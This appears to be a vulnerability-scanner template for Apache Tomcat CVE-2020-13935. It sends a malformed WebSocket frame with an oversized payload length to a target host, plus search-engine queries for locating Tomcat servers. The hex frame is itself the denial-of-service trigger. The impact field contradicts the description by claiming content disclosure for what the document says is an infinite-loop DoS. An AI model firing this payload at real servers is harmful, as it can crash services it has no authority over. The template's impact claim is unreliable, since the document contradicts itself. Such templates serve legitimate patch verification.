id: CVE-2020-13935

info:
  name: Apache Tomcat WebSocket Vulnerability CVE-2020-13935
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The payload length in a WebSocket frame was not correctly validated in Apache Tomcat versions 10.0.0-M1 to 10.0.0-M6, 9.0.0.M1 to 9.0.36, 8.5.0 to 8.5.56, and 7.0.27 to 7.0.104. Invalid payload lengths could trigger an infinite loop, leading to a denial of service.
  impact: |
    Remote attackers can read sensitive web resource content.
  remediation: |
    Apply the necessary security patches provided by Apache to mitigate CVE-2020-13935.
  reference:
    - http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00084.html
    - http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00088.html
    - https://kc.mcafee.com/corporate/index?page=content&id=SB10332
    - https://lists.apache.org/thread.html/r4e5d3c09f4dd2923191e972408b40fb8b42dbff0bc7904d44b651e50%40%3Cusers.tomcat.apache.org%3E
    - https://lists.debian.org/debian-lts-announce/2020/07/msg00017.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2020-13935
    cwe-id: CWE-835
    epss-score: 0.148
    epss-percentile: 0.9598
    cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: tomcat
    shodan-query: title:"Apache Tomcat"
    fofa-query:
      - body="apache tomcat"
      - body="jk status manager"
      - title="apache tomcat"
    google-query: intitle:"apache tomcat"
tcp:
  - inputs:
      - data: "8107ffffffffffffffff"
        type: hex
    host:
      - "{{Hostname}}"
    read-size: 1024

    matchers-condition: and
    matchers:
      - type: word
        part: data
        words:
          - "Error"
          - "Invalid"
          - "Failure"
